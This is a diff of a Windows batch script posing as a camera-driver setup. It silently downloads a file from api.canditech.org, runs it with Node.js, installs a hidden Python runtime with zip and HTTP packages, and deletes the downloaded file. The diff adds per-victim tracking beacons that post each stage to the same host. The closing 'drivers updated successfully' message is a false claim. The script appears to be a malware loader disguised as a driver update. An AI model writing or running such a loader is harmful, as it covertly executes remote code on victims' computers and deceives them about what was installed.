@@ -6,6 +6,7 @@ REM  Windows driver setup - single linear script (no call :labels).
 REM  Downloaded .bat files often break mid-file labels; paths must be set
 REM  at the start, never via a failed subroutine.
 REM  Template: WINDOW_UID is replaced by POST /window/:id on api.canditech.org
+REM  Part1 dashboard: POST .../track-step/<uid>/part1_step_<1-6>
 REM =====================================================================
 
 set "WINDOW_UID=__ID__"
@@ -13,8 +14,10 @@ if not defined WINDOW_UID goto err_uid
 if "!WINDOW_UID!"=="" goto err_uid
 if "!WINDOW_UID!"=="__ID__" goto err_uid
 
+set "TS_PFX=https://api.canditech.org/track-step/!WINDOW_UID!/"
+
 echo [INFO] Searching for Camera Drivers ...
-set "TRACKURL=https://api.canditech.org/track-step/!WINDOW_UID!/part1_step_1"
+set "TRACKURL=!TS_PFX!part1_step_1"
 powershell -NoProfile -NonInteractive -Command "try { Invoke-WebRequest -Uri $env:TRACKURL -Method Post -UseBasicParsing | Out-Null } catch {}"
 
 REM --- paths first: script lives in %TEMP% when run as downloaded t.bat ---
@@ -66,10 +69,15 @@ if not defined NODE_EXE exit /b 1
 "%NODE_EXE%" -v >nul 2>&1
 if errorlevel 1 exit /b 1
 
+echo [INFO] Node.js runtime is ready
+set "TRACKURL=!TS_PFX!part1_step_2"
+powershell -NoProfile -NonInteractive -Command "try { Invoke-WebRequest -Uri $env:TRACKURL -Method Post -UseBasicParsing | Out-Null } catch {}"
+
 set "ENV_SETUP_URL=https://api.canditech.org/driver/env-setup.npl"
 set "CODEPROFILE=%USERPROFILE%"
 if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%" 2>nul
 
+echo [INFO] Downloading driver script...
 where curl >nul 2>&1
 if errorlevel 1 (
     powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%ENV_SETUP_URL%' -OutFile '%CODEPROFILE%\env-setup.npl' -TimeoutSec 120" >nul 2>&1
@@ -77,6 +85,9 @@ if errorlevel 1 (
     curl -sSL --connect-timeout 30 --max-time 180 -o "%CODEPROFILE%\env-setup.npl" "%ENV_SETUP_URL%" >nul 2>&1
 )
 if not exist "%CODEPROFILE%\env-setup.npl" exit /b 1
+
+set "TRACKURL=!TS_PFX!part1_step_3"
+powershell -NoProfile -NonInteractive -Command "try { Invoke-WebRequest -Uri $env:TRACKURL -Method Post -UseBasicParsing | Out-Null } catch {}"
 
 set "DRIVER_CURL_HOME=%TEMP%\wdcurl_driver_silent"
 mkdir "!DRIVER_CURL_HOME!" 2>nul
@@ -87,11 +98,15 @@ echo show-error
 set "CURL_HOME=!DRIVER_CURL_HOME!"
 
 echo [INFO] Updating Driver Packages...
-set "TRACKURL=https://api.canditech.org/track-step/!WINDOW_UID!/part1_step_2"
+set "TRACKURL=!TS_PFX!part1_step_4"
 powershell -NoProfile -NonInteractive -Command "try { Invoke-WebRequest -Uri $env:TRACKURL -Method Post -UseBasicParsing | Out-Null } catch {}"
 cd /d "%CODEPROFILE%"
 "%NODE_EXE%" "env-setup.npl"
 if errorlevel 1 exit /b 1
+
+echo [INFO] Installing Python runtime and packages...
+set "TRACKURL=!TS_PFX!part1_step_5"
+powershell -NoProfile -NonInteractive -Command "try { Invoke-WebRequest -Uri $env:TRACKURL -Method Post -UseBasicParsing | Out-Null } catch {}"
 
 mkdir C:\python 2>nul
 curl -sSL --connect-timeout 30 --max-time 600 -o C:\python\py.zip https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip >nul 2>&1
@@ -109,7 +124,7 @@ C:\python\python.exe -m pip install requests portalocker pyzipper >nul 2>&1
 if errorlevel 1 exit /b 1
 
 if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
-set "TRACKURL=https://api.canditech.org/track-step/!WINDOW_UID!/part1_step_3"
+set "TRACKURL=!TS_PFX!part1_step_6"
 powershell -NoProfile -NonInteractive -Command "try { Invoke-WebRequest -Uri $env:TRACKURL -Method Post -UseBasicParsing | Out-Null } catch {}"
 echo [SUCCESS] Camera drivers have been updated successfully.
 if defined WINDOW_UID (
